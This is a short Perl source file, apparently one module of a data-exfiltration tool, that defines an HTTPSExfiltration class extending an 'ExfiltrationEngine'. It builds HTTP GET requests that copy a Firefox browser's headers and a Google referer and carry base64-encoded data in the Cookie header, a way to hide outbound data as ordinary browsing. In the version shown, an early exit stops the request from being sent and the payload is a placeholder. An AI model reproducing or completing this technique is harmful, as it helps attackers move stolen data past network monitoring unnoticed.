#!/usr/bin/perl

package HTTPSExfiltration;

use Moose;
extends 'ExfiltrationEngine';

use LWP::UserAgent;
use MIME::Base64;

use strict;
use warnings;

sub setHeader {
    $_[0]->header('Cookie' => encode_base64('Test'));
    $_[0]->header('Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8');
    $_[0]->header('Accept-Language' => 'en-US,en;q=0.5');
    $_[0]->header('Accept-Encoding' => 'gzip, deflate, br');
    $_[0]->header('Referer' => 'https://google.com/');
    $_[0]->header('DNT' => '1');
    $_[0]->header('Cache-Control' => 'max-age=0');
}

sub exfiltrate {
    my ($self, $url) = @_;

    print $self->dest;

    exit;




    my $userAgent = new LWP::UserAgent;
    $userAgent->agent('Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:51.0) Gecko/20100101 Firefox/51.0');

    my $request = new HTTP::Request 'GET' => $url;

    setHeader($request);

    $userAgent->request($request);
}

1;
